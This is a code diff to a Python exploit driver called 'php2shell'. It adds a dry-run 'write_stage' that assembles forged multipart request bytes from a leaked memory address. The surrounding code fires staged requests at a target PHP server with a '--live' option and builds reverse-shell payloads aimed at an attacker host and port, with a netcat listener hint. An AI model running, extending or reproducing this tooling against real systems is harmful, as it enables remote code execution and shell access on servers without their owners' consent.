@@ -21,6 +21,7 @@ sys.path.insert(0, str(HERE.parent))  # allow script-mode package imports
 from tool.modules import profiles  # noqa: E402  (after HERE bootstrap)
 from tool.modules import producer_fpmwiki as producer_stage  # noqa: E402
 from tool.modules import producer_modphp as modphp_producer_stage  # noqa: E402
+from tool.modules import write_stage as write_stage_module  # noqa: E402
 from tool.stages import probe as probe_stage  # noqa: E402
 
 
@@ -68,8 +69,8 @@ ID_LINE = re.compile(
     rb"gid=[0-9]+\([A-Za-z0-9_.-]+\) groups=[^\r\n]+$"
 )
 
-# argv-driven stage list (receipt ladder order): producer -> chain; recon reads.
-STAGES = ("recon", "producer", "chain")
+# argv-driven stage list (receipt ladder order): producer -> write_stage -> chain; recon reads.
+STAGES = ("recon", "producer", "write_stage", "chain")
 
 
 def run_producer_step(
@@ -127,6 +128,25 @@ def producer_fpmwiki_fire_or_dry(
     if live:
         return producer_stage.fire(host, port, body_bytes, output, timeout=timeout)
     return producer_stage.dry(host_header, body_bytes, output)
+
+
+def run_write_stage_step(
+    profile_name: str | None,
+    main_chunk: int,
+    ordinal: int,
+    payload: str,
+    output: Path,
+) -> tuple[dict, Path]:
+    """Write stage: dry-only skeleton (exact attempt()-shaped final multipart
+    bytes via the documented COMPACT.probe_body call; never sends)."""
+    if profile_name is None:
+        raise ValueError("write_stage needs a bound binary profile (pass --profile)")
+    summary = write_stage_module.dry(
+        main_chunk, ordinal, payload, BINARY_PROFILES[profile_name], output)
+    summary["step"] = "write_stage"
+    rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
+    (output / "result.json").write_text(rendered)
+    return summary, output / "result.json"
 
 
 def parse_url(value: str) -> tuple[str, int, str, str]:
@@ -466,8 +486,10 @@ def run_recon(
 def main() -> int:
     parser = argparse.ArgumentParser(
         description="php2shell chain driver: --step recon (read-only receipt), "
-        "--step producer (fpmwiki producer: offline byte-build default, --live "
-        "to fire), or --step chain (blocker-hold + rearm + forged staged multipart)"
+        "--step producer (fpmwiki/modphp producers: offline byte-build default, "
+        "--live to fire), --step write_stage (dry skeleton: final forged "
+        "multipart bytes, no send), or --step chain (blocker-hold + rearm + "
+        "forged staged multipart)"
     )
     parser.add_argument(
         "--target",
@@ -522,6 +544,18 @@ def main() -> int:
         default=None,
         help="producer (modphp): dry sid override (receipt: labprobe123) or "
         "32-hex sid for --live (Cookie: PHPSESSID transport)",
+    )
+    parser.add_argument(
+        "--main-chunk",
+        default=None,
+        help="write_stage: leaked main chunk hex (offline substitute for the "
+        "live leak; the write step never sends)",
+    )
+    parser.add_argument(
+        "--ordinal",
+        type=int,
+        default=0,
+        help="write_stage: dso_deltas ordinal (see attempt())",
     )
 
 
@@ -596,11 +630,12 @@ def main() -> int:
         args.output = HERE.parent / "files" / "io" / f"{target_name or 'adhoc'}-{args.step}-{stamp}"
 
     payload = None
-    if args.step == "chain":
+    if args.step in ("chain", "write_stage"):
         payload = command_mode(args.command, args.lhost, args.lport)
         if args.command == "revshell":
             print(f"[i] payload command: {payload}")
             print(f"[i] start the listener first, e.g.: nc -lvnp {args.lport}")
+    if args.step == "chain":
         hold = (
             f"GET {path} HTTP/1.1\r\n"
             f"Host: {host_header}\r\n"
@@ -629,6 +664,33 @@ def main() -> int:
                 "port": port,
                 "path": path,
                 "body_bytes": args.body_bytes,
+                "error": f"{type(error).__name__}: {error}",
+            }
+            rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
+            args.output.mkdir(parents=True, exist_ok=True)
+            (args.output / "result.json").write_text(rendered)
+            print(rendered, end="")
+            return 2
+    elif args.step == "write_stage":
+        if args.main_chunk is None:
+            parser.error(
+                "--step write_stage (dry skeleton) requires --main-chunk HEX "
+                "(offline leak substitute; this step never sends)"
+            )
+        try:
+            main_chunk = int(args.main_chunk, 16)
+        except ValueError:
+            parser.error("--main-chunk must be a hex value (e.g. 0x7f8875a00000)")
+        try:
+            summary, _receipt = run_write_stage_step(
+                profile_name, main_chunk, args.ordinal, payload, args.output,
+            )
+        except (ValueError, TypeError, OSError) as error:
+            summary = {
+                "step": "write_stage",
+                "target": {"url": url, "host": host, "port": port, "path": path},
+                "main_chunk": args.main_chunk,
+                "ordinal": args.ordinal,
                 "error": f"{type(error).__name__}: {error}",
             }
             rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
@@ -709,6 +771,9 @@ def main() -> int:
         # producer dry build: 0 = recorded; 2 = over the post_max_size ceiling
         # (byte templates are still recorded, but --live would refuse to send)
         return 2 if summary.get("over_budget") else 0
+    if args.step == "write_stage":
+        # write_stage dry skeleton: 0 = byte templates recorded (never sends)
+        return 0
     # recon exit code: 0 = worker responded with a parseable HTTP exchange;
     # arm/probe field-level outcomes live in the receipt for human review.
     return 0 if summary.get("preflight", {}).get("alive") else 2
